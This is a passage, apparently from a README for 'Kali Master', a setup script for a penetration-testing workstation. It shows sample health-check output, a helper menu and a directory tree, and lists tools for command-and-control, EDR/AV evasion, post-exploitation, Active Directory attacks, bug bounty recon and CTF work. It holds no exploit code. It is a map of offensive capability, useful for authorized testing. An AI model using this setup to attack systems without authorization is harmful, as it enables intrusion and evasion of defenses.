  ────────────────────────────────────────────────────────
    [✔] sliver-server → /usr/local/bin/sliver-server
    [✔] havoc → /usr/local/bin/havoc
    ... (6 more)

    Category Status: 8/8 (100%)

  CATEGORY BREAKDOWN
  ────────────────────────────────────────────────────────
    ✔ Bug Bounty Tools: 28/28 (100%)
    ✔ Network & Exploitation: 10/10 (100%)
    ✔ Reverse Engineering: 16/16 (100%)
    ✔ C2 Frameworks: 8/8 (100%)
    ✔ Cloud Security: 5/5 (100%)
    ✔ EDR/AV Evasion: 7/7 (100%)
    ✔ Post-Exploitation: 4/4 (100%)
    ✔ Active Directory: 4/4 (100%)
    ✔ Runtimes & Core: 7/7 (100%)

  OVERALL STATUS
  ────────────────────────────────────────────────────────
    [████████████████████████████████████████████████████] 100%

[PHASE 4/4] AUTO-FIX DECISION
  ✔ All tools installed successfully!

═══════════════════════════════════════════════════════
  HEALTH CHECK COMPLETE
═══════════════════════════════════════════════════════

  Duration:       0m 45s
  Total Checked:  106 items
  Passed:         106 items
  Failed:         0 items
  Success Rate:   100%

  🎉 All tools are installed!

  Quick Commands:
    kali-master status       → Show dashboard
    kali-master fix          → Check missing tools
    kali-master tools        → List all tools
    c2-menu                  → C2 launcher
    lab-manager              → Lab manager
```

---

### 25. helper-menu — Interactive Menu

Interactive menu for all helper scripts.

```bash
helper-menu
```

#### Output Example

```
═══════════════════════════════════════════════════════
       KALI MASTER — HELPER SCRIPTS MENU
═══════════════════════════════════════════════════════

[WORKSPACE CREATORS]
  1) newbb <domain>          → Bug Bounty workspace
  2) newctf <name>           → CTF workspace
  3) newad <domain>          → Active Directory workspace
  4) newpayload <name>       → Payload development workspace
  5) newredteam <name>       → Red Team operation

[RECONNAISSANCE]
  6) bb-recon <domain>       → Bug bounty recon (12 steps)
  7) sub-enum <domain>       → Subdomain enumeration
  8) api-recon <url>         → API reconnaissance
  9) cloud-recon <target>    → Cloud enumeration
  10) port-scan <target>     → Port scanning
  11) dir-fuzz <url>         → Directory fuzzing
  12) vuln-scan <target>     → Vulnerability scanning

[UTILITIES]
  13) merge-results          → Merge scan results
  14) report-gen <dir>       → Generate report
  15) notify-recon           → Send notifications

  0) Exit

Select [0-15]:
```

---

## 📁 Directory Structure

```
/
├── opt/
│   ├── kali-venv/               # Central Python virtual environment (289 packages)
│   ├── angr-venv/               # Isolated angr environment (45 packages)
│   ├── flare-venv/              # Isolated FLARE environment (12 packages)
│   ├── c2-frameworks/           # C2 framework base directory
│   ├── c2-redirectors/          # Nginx redirector configs + templates
│   │   ├── sites-available/
│   │   ├── sites-enabled/
│   │   ├── templates/
│   │   └── logs/
│   ├── evasion-tools/           # EDR/AV evasion binaries and source
│   │   ├── donut/               # Donut binary + source
│   │   ├── ScareCrow/           # ScareCrow binary + source
│   │   ├── sgn/                 # SGN binary + source
│   │   ├── pe-sieve/            # PE-Sieve build
│   │   ├── hollows_hunter/      # Hollows Hunter build
│   │   └── nimcrypt2/           # Nimcrypt2 binary + source
│   ├── postexploit/             # Post-exploitation binaries
│   │   ├── linux/               # LinPEAS, pspy (8 tools)
│   │   ├── windows/             # WinPEAS, mimikatz, Rubeus, SharpUp (10 tools)
│   │   └── tunneling/           # chisel, ligolo-ng, rpivot, ssf (4 tools)
│   ├── tools/                   # Misc tool directory
│   │   ├── bin/
│   │   ├── wordlists/
│   │   ├── exploits/
│   │   ├── scripts/
│   │   ├── payloads/
│   │   └── github/              # Python GitHub-cloned tools
│   ├── wordlists/               # Wordlist symlinks
│   │   ├── SecLists/            # 19,000+ files
│   │   └── web/
│   │       ├── fuzzdb/
│   │       └── PayloadsAllTheThings/
│   ├── Havoc/                   # Havoc C2
│   ├── Mythic/                  # Mythic C2
│   ├── Covenant/                # Covenant C2
│   ├── Empire/                  # Empire C2
│   ├── Starkiller/              # Starkiller GUI
│   ├── merlin/                  # Merlin C2
│   └── NimPlant/                # NimPlant C2
├── usr/local/bin/               # All helper scripts + tool wrappers (107 tools)
├── root/
│   ├── .config/kali-master/
│   │   ├── secrets.env          # API keys (chmod 600)
│   │   ├── load_secrets.sh      # Auto-loader for secrets
│   │   ├── backups/             # System state backups
│   │   ├── profiles/            # Secret profiles
│   │   └── templates/           # Tool templates
│   ├── .kali-master/
│   │   └── state/               # Step completion state files
│   ├── .kali_env.zsh            # Environment variables + aliases (60+ aliases)
│   ├── .p10k.zsh                # Powerlevel10k theme config
│   ├── .oh-my-zsh/              # Oh-My-Zsh installation
│   │   └── custom/
│   │       ├── plugins/         # 7 Zsh plugins
│   │       └── themes/
│   │           └── powerlevel10k/
│   ├── .pwndbg/                 # pwndbg GDB plugin
│   ├── .gdbinit                 # GDB init (loads GEF)
│   └── .gf/                     # gf pattern library
├── home/
│   ├── go/bin/                  # Go tool binaries (29 tools)
│   ├── bugbounty/               # Bug Bounty workspaces
│   ├── ctf/                     # CTF workspaces
│   ├── redteam/
│   │   ├── ad/                  # AD engagement workspaces
│   │   └── operations/          # Red Team operation workspaces
│   └── payloads/                # Payload development workspaces
└── var/log/
    └── kali_master_v6_<date>.log  # Installation log
```

---

## 🛠️ Tool Categories (300+ Tools)

### 🐛 Bug Bounty (60+ tools)

**ProjectDiscovery Suite (18):**
```
subfinder, httpx, nuclei, dnsx, naabu, katana, interactsh-client, notify,
mapcidr, tlsx, shuffledns, asnmap, alterx, uncover, cvemap, pdtm, cloudlist, proxify
```

**Go Recon Tools (20):**
```
dalfox, gobuster, ffuf, trufflehog, gau, hakrawler, anew, qsreplace, gf,
waybackurls, assetfinder, httprobe, meg, unfurl, gospider, gron, dsieve,
getJS, subjs, chisel
```

**Python Bug Bounty (16):**
```
xsstrike, corsy, linkfinder, ssrfmap, jwt_tool, sublist3r, arjun, waymore,
dnsgen, dirsearch, commix, wfuzz, nomore403, cent, shosubgo, smuggler
```

**APT Security Tools (6):**
```
sqlmap, amass, whatweb, dirb, nikto, wpscan
```

**Cargo Tools (1):**
```
feroxbuster
```

---

### 🌐 Network & Active Directory (35+ tools)

**Core Network Tools:**
```
nmap, masscan, hydra, medusa, crackmapexec, evil-winrm, netexec (nxc),
responder, ettercap, bettercap, smbclient, smbmap, enum4linux, kerbrute, rpcclient
```

**AD Enumeration:**
```
bloodhound, neo4j, certipy-ad, ldeep, bloodyad, ldapdomaindump, donpapi,
ntlmrecon, pywhisker, targetedKerberoast, adidnsdump, manspider,
roastinthemiddle, windapsearch, silenthound, ADEnum
```

---

### 🔬 Reverse Engineering (30+ tools)

**Core RE:**
```
gdb, radare2, ghidra, rizin, cutter, imhex, binwalk, foremost, yara,
apktool, jadx, checksec
```

**Python RE:**
```
volatility3, flare-capa, flare-floss, pwntools, ROPgadget, ropper, pefile, r2pipe
```

**Ruby RE:**
```
one_gadget, seccomp-tools
```

**Malware Analysis:**
```
pe-sieve, hollows_hunter, nimcrypt2
```

---

### 🏆 CTF (25+ tools)

**Password Cracking:**
```
john, hashcat, hydra, medusa
```

**Steganography:**
```
steghide, stegseek, zsteg, outguess, stegoveritas, stegsolve, stegextract
```

**Forensics:**
```
binwalk, foremost, testdisk, photorec, autopsy, bulk_extractor, exiftool
```

**Cryptography:**
```
rsactftool, factordb-cli, ciphey, xortool, hash_extender, basecrack
```

**Web CTF:**
```
tplmap, dotdotpwn, aircrack-ng
```

---

### ☁️ Cloud Security (30+ tools)

**Container Security:**
```
trivy, grype, syft, dive, dockle
<think>
</think>
